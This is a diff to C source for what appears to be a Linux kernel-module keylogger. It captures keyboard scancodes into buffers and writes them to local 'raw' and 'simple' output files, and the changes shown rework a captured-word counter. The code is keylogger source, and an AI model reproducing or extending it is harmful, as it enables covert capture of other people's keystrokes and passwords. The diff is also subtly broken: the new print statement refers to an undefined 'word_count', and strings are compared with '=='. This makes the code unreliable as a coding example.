@@ -6,7 +6,6 @@
 #include <linux/interrupt.h>
 #include <asm/io.h>
 #include <linux/mutex.h>
-//#include <sharedVariable.h>
 
 #include <linux/hrtimer.h>
 #include <linux/sched.h>
@@ -43,8 +42,6 @@ const char* raw_path = "./raw_output.txt";
 const char* simple_path = "./simple_output.txt"; // doesn't include keys such as CAPSLOCK or SHIFT in the output file
 struct file *raw_outfile;
 struct file *simple_outfile;
-int count = 0;
-//char* path;
 
 // character buffer variables
 #define B_SIZE 1000
@@ -273,7 +270,7 @@ void write_to_simple_buffer(char scancode, char* key)
 			simple_pos++;
 		}
 
-		else if (scancode == BACKSPACE) // NOTE: backspace can be buggy if used right after switching windows
+		else if (scancode == BACKSPACE) // NOTE: backspace can produce incorrect results if used right after switching windows
 		{
 			if ((simple_pos - 1) != 0)
 			{
@@ -344,7 +341,7 @@ void write_buffer_to_output(void)
 	int i = 0;
 	int max_raw_size = B_SIZE;
 	int max_simple_size = B_SIZE;
-	char* display_count = "Words this program captured: ";
+	int simple_word_count = 1;
  
 	if (raw_rollover == 0)
 	{
@@ -360,9 +357,6 @@ void write_buffer_to_output(void)
 	while (i < max_raw_size)
 	{
 		write_to_file(raw_outfile, 0, raw_char_buffer[i], strlen(raw_char_buffer[i]));
-		if(raw_char_buffer[i]  == " ") {
-		  count++;
-		}
 		i++;
 	}
 
@@ -370,15 +364,17 @@ void write_buffer_to_output(void)
 	i = 0;
 	while (i < max_simple_size)
 	{
+		if(simple_char_buffer[i]  == " ") {
+		  simple_word_count++;
+		}
 		write_to_file(simple_outfile, 0, simple_char_buffer[i], strlen(simple_char_buffer[i]));
 		i++;
 	}
-	
-	display_count += count;
-	write_to_file(raw_outfile, 0, display_count, 1);
+
 	printk("Character buffers written to output.\n");
 	printk("Raw character buffer written to %s.\n", raw_path);
 	printk("Simple character buffer written to %s.\n", simple_path);
+	printk("Number of words in %s: %d\n", simple_path, word_count);
 }
 
 // generates a timestamp string in the form [hh:mm:ss]
